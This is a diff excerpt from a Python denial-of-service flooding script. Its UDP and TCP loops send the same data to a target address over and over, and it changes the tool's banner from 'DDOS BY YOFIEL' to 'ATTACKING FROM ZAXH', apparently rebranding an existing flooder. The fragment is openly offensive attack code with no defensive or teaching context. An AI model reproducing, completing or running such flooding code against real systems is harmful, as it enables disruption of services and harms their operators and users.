@@ -47,7 +47,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" DDOS BY YOFIEL !!!")
+			print(i +" ATTACKING FROM ZAXH!!!")
 		except:
 			print("[!] ATTACKING FROM ZAXH!!!")
 
@@ -61,7 +61,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" DDOS BY YOFIEL !!!")
+			print(i +" ATTACKING FROM ZAXH!!!")
 		except:
 			s.close()
 			print("[*] ATTACKING FROM ZAXH!!!")
